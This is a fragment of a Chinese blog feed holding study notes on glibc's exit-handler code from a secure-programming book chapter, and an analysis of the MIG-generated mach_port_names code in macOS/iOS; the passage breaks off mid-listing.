class="number">103</span> <span class="built_in">exit</span> (<span class="keyword">int</span> status)</div><div class="line"><span class="number">104</span> &#123;</div><div class="line"><span class="number">105</span>   __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>, <span class="literal">true</span>);</div><div class="line"><span class="number">106</span> &#125;</div><div class="line">--------------</div><div class="line"><span class="keyword">void</span></div><div class="line"><span class="number">32</span>  attribute_hidden</div><div class="line"><span class="number">33</span>  __run_exit_handlers (<span class="keyword">int</span> status, <span class="keyword">struct</span> exit_function_list **listp,</div><div class="line"><span class="number">34</span>                       <span class="keyword">bool</span> run_list_atexit, <span class="keyword">bool</span> run_dtors)</div><div class="line"><span class="number">35</span>  &#123;</div><div class="line"></div><div class="line">        。。。。</div><div class="line"></div><div class="line"><span class="number">47</span>    <span class="keyword">while</span> (*listp != <span class="literal">NULL</span>)</div><div class="line"><span class="number">48</span>      &#123;</div><div class="line"><span class="number">49</span>        <span class="keyword">struct</span> exit_function_list *cur = *listp;</div><div class="line"><span class="number">50</span></div><div class="line"><span class="number">51</span>        <span class="keyword">while</span> (cur-&gt;idx &gt; <span class="number">0</span>)</div><div class="line"><span class="number">52</span>          &#123;</div><div class="line"><span class="number">53</span>            <span class="keyword">const</span> <span class="keyword">struct</span> exit_function *<span class="keyword">const</span> f =</div><div class="line"><span class="number">54</span>              &amp;cur-&gt;fns[--cur-&gt;idx];</div><div class="line"><span class="number">55</span>            <span class="keyword">switch</span> (f-&gt;flavor)</div><div class="line"><span class="number">56</span>              &#123;</div><div class="line"><span class="number">57</span>                <span class="keyword">void</span> (*atfct) (<span class="keyword">void</span>);</div><div class="line"><span class="number">58</span>                <span class="keyword">void</span> (*onfct) (<span class="keyword">int</span> status, <span class="keyword">void</span> *arg);</div><div class="line"><span class="number">59</span>                <span class="keyword">void</span> (*cxafct) (<span class="keyword">void</span> *arg, <span class="keyword">int</span> status);</div><div class="line"><span class="number">60</span></div><div class="line"><span class="number">61</span>              <span class="keyword">case</span> ef_free:</div><div class="line"><span class="number">62</span>              <span class="keyword">case</span> ef_us:</div><div class="line"><span class="number">63</span>                <span class="keyword">break</span>;</div><div class="line"><span class="number">64</span>              <span class="keyword">case</span> ef_on:</div><div class="line"><span class="number">65</span>                onfct = f-&gt;func.on.fn;</div><div class="line"><span class="number">66</span>  <span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></div><div class="line"><span class="number">67</span>                PTR_DEMANGLE (onfct);</div><div class="line"><span class="number">68</span>  <span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"><span class="number">69</span>                onfct (status, f-&gt;func.on.arg);</div><div class="line"><span class="number">70</span>                <span class="keyword">break</span>;</div><div class="line"><span class="number">71</span>              <span class="keyword">case</span> ef_at:     （<span class="number">3</span>）</div><div class="line"><span class="number">72</span>                atfct = f-&gt;func.at;</div><div class="line"><span class="number">73</span>  <span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></div><div class="line"><span class="number">74</span>                PTR_DEMANGLE (atfct);</div><div class="line"><span class="number">75</span>  <span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"><span class="number">76</span>                atfct ();</div><div class="line"><span class="number">77</span>                <span class="keyword">break</span>;</div><div class="line"><span class="number">78</span>              <span class="keyword">case</span> ef_cxa: （<span class="number">4</span>）</div><div class="line"><span class="number">79</span>                cxafct = f-&gt;func.cxa.fn;</div><div class="line"><span class="number">80</span>  <span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></div><div class="line"><span class="number">81</span>                PTR_DEMANGLE (cxafct);</div><div class="line"><span class="number">82</span>  <span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"><span class="number">83</span>                cxafct (f-&gt;func.cxa.arg, status);</div><div class="line"><span class="number">84</span>                <span class="keyword">break</span>;</div><div class="line"><span class="number">85</span>              &#125;</div><div class="line"><span class="number">86</span>          &#125;</div><div class="line"><span class="number">87</span></div><div class="line"><span class="number">88</span>        *listp = cur-&gt;next;</div><div class="line"><span class="number">89</span>        <span class="keyword">if</span> (*listp != <span class="literal">NULL</span>)</div><div class="line"><span class="number">92</span>          <span class="built_in">free</span> (cur);</div><div class="line"><span class="number">93</span>      &#125;</div><div class="line"><span class="number">94</span></div><div class="line"><span class="number">95</span>    <span class="keyword">if</span> (run_list_atexit)</div><div class="line"><span class="number">96</span>      RUN_HOOK (__libc_atexit, ());</div><div class="line"><span class="number">97</span></div><div class="line"><span class="number">98</span>    _exit (status);</div><div class="line"><span class="number">99</span>  &#125;</div></pre></td></tr></table></figure>
<h3 id="longjmp-函数"><a href="#longjmp-函数" class="headerlink" title="longjmp 函数"></a>longjmp 函数</h3><h4 id="Case-6"><a href="#Case-6" class="headerlink" title="Case"></a>Case</h4><h3 id="Dictionary"><a href="#Dictionary" class="headerlink" title="Dictionary"></a>Dictionary</h3><h3 id="关联章节"><a href="#关联章节" class="headerlink" title="关联章节"></a>关联章节</h3><h3 id="Change-Log"><a href="#Change-Log" class="headerlink" title="Change Log"></a>Change Log</h3><table>
<thead>
<tr>
<th>Time</th>
<th>Change</th>
</tr>
</thead>
<tbody>
<tr>
<td>2017-02-28</td>
<td>增加 3节</td>
</tr>
<tr>
<td>2017-03-1</td>
<td>89</td>
</tr>
<tr>
<td>2017-03-1</td>
<td>90</td>
</tr>
</tbody>
</table>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;《C++ 安全编程》 – 第 三 章：指针诡计&lt;br&gt;
    
    </summary>
    
      <category term="读书" scheme="http://yoursite.com/categories/%E8%AF%BB%E4%B9%A6/"/>
    
    
      <category term="熟悉" scheme="http://yoursite.com/tags/%E7%86%9F%E6%82%89/"/>
    
      <category term="读书笔记" scheme="http://yoursite.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>mach_port_names 函数分析</title>
    <link href="http://yoursite.com/2017/02/27/mach-port-names-%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2017/02/27/mach-port-names-函数分析/</id>
    <published>2017-02-26T16:04:45.000Z</published>
    <updated>2017-03-20T05:35:04.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<blockquote>
<p>在《深入解析MAC OS X &amp; iOS 操作系统》书上，代码清单10-1 中有一个例子 “Mach 端口导出器”， 分析代码流程搞清楚 MIG 的作用。</p>
</blockquote>
<a id="more"></a>
<h2 id="mach-port-names-–-MIG-分析"><a href="#mach-port-names-–-MIG-分析" class="headerlink" title="mach_port_names – MIG 分析"></a>mach_port_names – MIG 分析</h2><p>mach_port_names 此函数可以导出给定任务的端口名称空间。分析器原理+ 调用流程。</p>
<p>这个函数 在 mach 子系统 mach_port 中。该系统对应的 MIG 描述文件是/osfmk/mach/mach_port.defs。(这个目录下还有其他的子系统 defs描述文件)</p>
<p>在没有使用 mig 工具预编译 defs 文件时， 源码中是没有 mach_port.h 文件的。<br>mach_port.h 文件中 包含 mach_port 子系统 用于操作任务端口的所有函数。</p>
<p>步骤：</p>
<pre><code>1. 使用 MIG 生成 mach_port.h ..文件
2. 分析 MIG 生成的目录结构
3. 分析代码
4. 搞清楚 mach_port_names 原理
</code></pre><h3 id="使用-MIG-生成-mach-port-h-文件"><a href="#使用-MIG-生成-mach-port-h-文件" class="headerlink" title="使用 MIG 生成 mach_port.h ..文件"></a>使用 MIG 生成 mach_port.h ..文件</h3><p>直接运行命令就自动生成相关文件</p>
<blockquote>
<p>mig xxx.defs</p>
</blockquote>
<h3 id="分析-MIG-生成的目录结构"><a href="#分析-MIG-生成的目录结构" class="headerlink" title="分析 MIG 生成的目录结构"></a>分析 MIG 生成的目录结构</h3><p>一共4个文件<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">├── mach_port.defs</div><div class="line">├── mach_port.h</div><div class="line">├── mach_portServer.c</div><div class="line">├── mach_portUser.c</div></pre></td></tr></table></figure></p>
<p>查看文件</p>
<p>这里有 4个关键的函数<br>_Xmach_port_names(…) {<br>    <strong>MIG_check</strong>Request__mach_port_names_t</p>
<pre><code>RetCode = mach_port_names(In0P-&gt;Head.msgh_request_port, (mach_port_name_array_t *)&amp;(OutP-&gt;names.address), &amp;OutP-&gt;namesCnt, (mach_port_type_array_t *)&amp;(OutP-&gt;types.address), &amp;OutP-&gt;typesCnt);
</code></pre><p>}</p>
<p>_kernelrpc_mach_port_names(….) {</p>
<pre><code>__MIG_check__Reply__mach_port_names_t

设置返回值
</code></pre><p>}</p>
<p>reply code 比 request 大100, code 对应InP-&gt;Head.msgh_id<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div><div class="line">308</div><div class="line">309</div><div class="line">310</div><div class="line">311</div><div class="line">312</div><div class="line">313</div><div class="line">314</div><div class="line">315</div><div class="line">316</div><div class="line">317</div><div class="line">318</div><div class="line">319</div><div class="line">320</div><div class="line">321</div></pre></td><td class="code"><pre><div class="line">mach_port.h  #########################</div><div class="line"></div><div class="line"><span class="keyword">kern_return_t</span> _kernelrpc_mach_port_names</div><div class="line">(</div><div class="line">    <span class="keyword">ipc_space_t</span> task,</div><div class="line">    <span class="keyword">mach_port_name_array_t</span> *names,</div><div class="line">    <span class="keyword">mach_msg_type_number_t</span> *namesCnt,</div><div class="line">    <span class="keyword">mach_port_type_array_t</span> *types,</div><div class="line">    <span class="keyword">mach_msg_type_number_t</span> *typesCnt</div><div class="line">);</div><div class="line"></div><div class="line">mach_portUser.c  #########################</div><div class="line"></div><div class="line">mig_internal <span class="keyword">kern_return_t</span> __MIG_check__Reply__mach_port_names_t(__Reply__mach_port_names_t *Out0P)</div><div class="line">&#123;</div><div class="line"></div><div class="line">    <span class="keyword">typedef</span> __Reply__mach_port_names_t __Reply __attribute__((unused));</div><div class="line">    <span class="keyword">boolean_t</span> msgh_simple;</div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> __MigTypeCheck</span></div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> msgh_size;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">/* __MigTypeCheck */</span></span></div><div class="line">    <span class="keyword">if</span> (Out0P-&gt;Head.msgh_id != <span class="number">3300</span>) &#123;</div><div class="line">        <span class="keyword">if</span> (Out0P-&gt;Head.msgh_id == MACH_NOTIFY_SEND_ONCE)</div><div class="line">        &#123; <span class="keyword">return</span> MIG_SERVER_DIED; &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123; <span class="keyword">return</span> MIG_REPLY_MISMATCH; &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    msgh_simple = !(Out0P-&gt;Head.msgh_bits &amp; MACH_MSGH_BITS_COMPLEX);</div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> __MigTypeCheck</span></div><div class="line">    msgh_size = Out0P-&gt;Head.msgh_size;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> ((msgh_simple || Out0P-&gt;msgh_body.msgh_descriptor_count != <span class="number">2</span> ||</div><div class="line">        msgh_size != (<span class="keyword">mach_msg_size_t</span>)<span class="keyword">sizeof</span>(__Reply)) &amp;&amp;</div><div class="line">        (!msgh_simple || msgh_size != (<span class="keyword">mach_msg_size_t</span>)<span class="keyword">sizeof</span>(<span class="keyword">mig_reply_error_t</span>) ||</div><div class="line">        ((<span class="keyword">mig_reply_error_t</span> *)Out0P)-&gt;RetCode == KERN_SUCCESS))</div><div class="line">        &#123; <span class="keyword">return</span> MIG_TYPE_ERROR ; &#125;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">/* __MigTypeCheck */</span></span></div><div class="line"></div><div class="line">    <span class="keyword">if</span> (msgh_simple) &#123;</div><div class="line">        <span class="keyword">return</span> ((<span class="keyword">mig_reply_error_t</span> *)Out0P)-&gt;RetCode;</div><div class="line">    &#125;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> __MigTypeCheck</span></div><div class="line">    <span class="keyword">if</span> (Out0P-&gt;names.type != MACH_MSG_OOL_DESCRIPTOR) &#123;</div><div class="line">        <span class="keyword">return</span> MIG_TYPE_ERROR;</div><div class="line">    &#125;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">/* __MigTypeCheck */</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> __MigTypeCheck</span></div><div class="line">    <span class="keyword">if</span> (Out0P-&gt;types.type != MACH_MSG_OOL_DESCRIPTOR) &#123;</div><div class="line">        <span class="keyword">return</span> MIG_TYPE_ERROR;</div><div class="line">    &#125;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">/* __MigTypeCheck */</span></span></div><div class="line"></div><div class="line">    <span class="keyword">return</span> MACH_MSG_SUCCESS;</div><div class="line">&#125;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* !defined(__MIG_check__Reply__mach_port_names_t__defined) */</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* __MIG_check__Reply__mach_port_subsystem__ */</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ( __MigTypeCheck ) */</span></span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">/* Routine mach_port_names */</span></div><div class="line">mig_external <span class="keyword">kern_return_t</span> _kernelrpc_mach_port_names</div><div class="line">(</div><div class="line">    <span class="keyword">ipc_space_t</span> task,</div><div class="line">    <span class="keyword">mach_port_name_array_t</span> *names,</div><div class="line">    <span class="keyword">mach_msg_type_number_t</span> *namesCnt,</div><div class="line">    <span class="keyword">mach_port_type_array_t</span> *types,</div><div class="line">    <span class="keyword">mach_msg_type_number_t</span> *typesCnt</div><div class="line">)</div><div class="line">&#123;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span>  __MigPackStructs</span></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(4)</span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">    <span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</div><div class="line">        <span class="keyword">mach_msg_header_t</span> Head;</div><div class="line">    &#125; Request __attribute__((unused));</div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span>  __MigPackStructs</span></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack()</span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span>  __MigPackStructs</span></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(4)</span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">    <span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</div><div class="line">        <span class="keyword">mach_msg_header_t</span> Head;</div><div class="line">        <span class="comment">/* start of the kernel processed data */</span></div><div class="line">        <span class="keyword">mach_msg_body_t</span> msgh_body;</div><div class="line">        <span class="keyword">mach_msg_ool_descriptor_t</span> names;</div><div class="line">        <span class="keyword">mach_msg_ool_descriptor_t</span> types;</div><div class="line">        <span class="comment">/* end of the kernel processed data */</span></div><div class="line">        NDR_record_t NDR;</div><div class="line">        <span class="keyword">mach_msg_type_number_t</span> namesCnt;</div><div class="line">        <span class="keyword">mach_msg_type_number_t</span> typesCnt;</div><div class="line">        <span class="keyword">mach_msg_trailer_t</span> trailer;</div><div class="line">    &#125; Reply __attribute__((unused));</div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span>  __MigPackStructs</span></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack()</span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span>  __MigPackStructs</span></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(4)</span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">    <span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</div><div class="line">        <span class="keyword">mach_msg_header_t</span> Head;</div><div class="line">        <span class="comment">/* start of the kernel processed data */</span></div><div class="line">        <span class="keyword">mach_msg_body_t</span> msgh_body;</div><div class="line">        <span class="keyword">mach_msg_ool_descriptor_t</span> names;</div><div class="line">        <span class="keyword">mach_msg_ool_descriptor_t</span> types;</div><div class="line">        <span class="comment">/* end of the kernel processed data */</span></div><div class="line">        NDR_record_t NDR;</div><div class="line">        <span class="keyword">mach_msg_type_number_t</span> namesCnt;</div><div class="line">        <span class="keyword">mach_msg_type_number_t</span> typesCnt;</div><div class="line">    &#125; __Reply __attribute__((unused));</div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span>  __MigPackStructs</span></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack()</span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">    <span class="comment">/*</span></div><div class="line">     * typedef struct &#123;</div><div class="line">     *  mach_msg_header_t Head;</div><div class="line">     *  NDR_record_t NDR;</div><div class="line">     *  kern_return_t RetCode;</div><div class="line">     * &#125; mig_reply_error_t;</div><div class="line">     */</div><div class="line"></div><div class="line">    <span class="keyword">union</span> &#123;</div><div class="line">        Request In;</div><div class="line">        Reply Out;</div><div class="line">    &#125; Mess;</div><div class="line"></div><div class="line">    Request *InP = &amp;Mess.In;</div><div class="line">    Reply *Out0P = &amp;Mess.Out;</div><div class="line"></div><div class="line">    <span class="keyword">mach_msg_return_t</span> msg_result;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span>  __MIG_check__Reply__mach_port_names_t__defined</span></div><div class="line">    <span class="keyword">kern_return_t</span> check_result;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">/* __MIG_check__Reply__mach_port_names_t__defined */</span></span></div><div class="line"></div><div class="line">    __DeclareSendRpc(<span class="number">3200</span>, <span class="string">"mach_port_names"</span>)  <span class="comment">//[将mach_port_names函数 绑定到对应的编号 ]</span></div><div class="line"></div><div class="line">    <span class="comment">// 准备消息头</span></div><div class="line">    InP-&gt;Head.msgh_bits =</div><div class="line">        MACH_MSGH_BITS(<span class="number">19</span>, MACH_MSG_TYPE_MAKE_SEND_ONCE);</div><div class="line">    <span class="comment">/* msgh_size passed as argument */</span></div><div class="line">    InP-&gt;Head.msgh_request_port = task;</div><div class="line">    InP-&gt;Head.msgh_reply_port = mig_get_reply_port();</div><div class="line">    InP-&gt;Head.msgh_id = <span class="number">3200</span>;</div><div class="line">    InP-&gt;Head.msgh_reserved = <span class="number">0</span>;</div><div class="line"></div><div class="line"><span class="comment">/* BEGIN VOUCHER CODE */</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> USING_VOUCHERS</span></div><div class="line">    <span class="keyword">if</span> (voucher_mach_msg_set != <span class="literal">NULL</span>) &#123;</div><div class="line">        voucher_mach_msg_set(&amp;InP-&gt;Head);</div><div class="line">    &#125;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// USING_VOUCHERS</span></span></div><div class="line"></div><div class="line"><span class="comment">/* END VOUCHER CODE */</span></div><div class="line"></div><div class="line">    __BeforeSendRpc(<span class="number">3200</span>, <span class="string">"mach_port_names"</span>)</div><div class="line"></div><div class="line"></div><div class="line">    <span class="comment">// 由 MIG 生成的 调用 mach_msg</span></div><div class="line">    msg_result = mach_msg(&amp;InP-&gt;Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (<span class="keyword">mach_msg_size_t</span>)<span class="keyword">sizeof</span>(Request), (<span class="keyword">mach_msg_size_t</span>)<span class="keyword">sizeof</span>(Reply), InP-&gt;Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);</div><div class="line"></div><div class="line"></div><div class="line">    __AfterSendRpc(<span class="number">3200</span>, <span class="string">"mach_port_names"</span>)</div><div class="line">    <span class="keyword">if</span> (msg_result != MACH_MSG_SUCCESS) &#123;</div><div class="line">        __MachMsgErrorWithoutTimeout(msg_result);</div><div class="line">        &#123; <span class="keyword">return</span> msg_result; &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__MIG_check__Reply__mach_port_names_t__defined)</span></div><div class="line">    check_result = __MIG_check__Reply__mach_port_names_t((__Reply__mach_port_names_t *)Out0P);</div><div class="line">    <span class="keyword">if</span> (check_result != MACH_MSG_SUCCESS)</div><div class="line">        &#123; <span class="keyword">return</span> check_result; &#125;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">/* defined(__MIG_check__Reply__mach_port_names_t__defined) */</span></span></div><div class="line"></div><div class="line"></div><div class="line">    <span class="comment">// 返回 数据到 userspace</span></div><div class="line">    *names = (<span class="keyword">mach_port_name_array_t</span>)(Out0P-&gt;names.address);</div><div class="line">    *namesCnt = Out0P-&gt;namesCnt;</div><div class="line"></div><div class="line">    *types = (<span class="keyword">mach_port_type_array_t</span>)(Out0P-&gt;types.address);</div><div class="line">    *typesCnt = Out0P-&gt;typesCnt;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> KERN_SUCCESS;</div><div class="line">&#125;</div><div class="line"></div><div class="line">mach_portServer.c  #########################</div><div class="line"></div><div class="line"><span class="comment">// 检查用户传入的参数，直接返回结果</span></div><div class="line">mig_internal <span class="keyword">kern_return_t</span> __MIG_check__Request__mach_port_names_t(__attribute__((__unused__)) __Request__mach_port_names_t *In0P)</div><div class="line">&#123;</div><div class="line"></div><div class="line">    <span class="keyword">typedef</span> __Request__mach_port_names_t __Request;</div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> __MigTypeCheck</span></div><div class="line">    <span class="keyword">if</span> ((In0P-&gt;Head.msgh_bits &amp; MACH_MSGH_BITS_COMPLEX) ||</div><div class="line">        (In0P-&gt;Head.msgh_size != (<span class="keyword">mach_msg_size_t</span>)<span class="keyword">sizeof</span>(__Request)))</div><div class="line">        <span class="keyword">return</span> MIG_BAD_ARGUMENTS;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">/* __MigTypeCheck */</span></span></div><div class="line"></div><div class="line">    <span class="keyword">return</span> MACH_MSG_SUCCESS;</div><div class="line">&#125;</div><div class="line"></div><div class="line">mig_internal novalue _Xmach_port_names</div><div class="line">    (<span class="keyword">mach_msg_header_t</span> *InHeadP, <span class="keyword">mach_msg_header_t</span> *OutHeadP)</div><div class="line">&#123;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span>  __MigPackStructs</span></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(4)</span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">    <span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</div><div class="line">        <span class="keyword">mach_msg_header_t</span> Head;</div><div class="line">        <span class="keyword">mach_msg_trailer_t</span> trailer;</div><div class="line">    &#125; Request __attribute__((unused));</div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span>  __MigPackStructs</span></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack()</span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">    <span class="keyword">typedef</span> __Request__mach_port_names_t __Request;</div><div class="line">    <span class="keyword">typedef</span> __Reply__mach_port_names_t Reply __attribute__((unused));</div><div class="line"></div><div class="line">    <span class="comment">/*</span></div><div class="line">     * typedef struct &#123;</div><div class="line">     *  mach_msg_header_t Head;</div><div class="line">     *  NDR_record_t NDR;</div><div class="line">     *  kern_return_t RetCode;</div><div class="line">     * &#125; mig_reply_error_t;</div><div 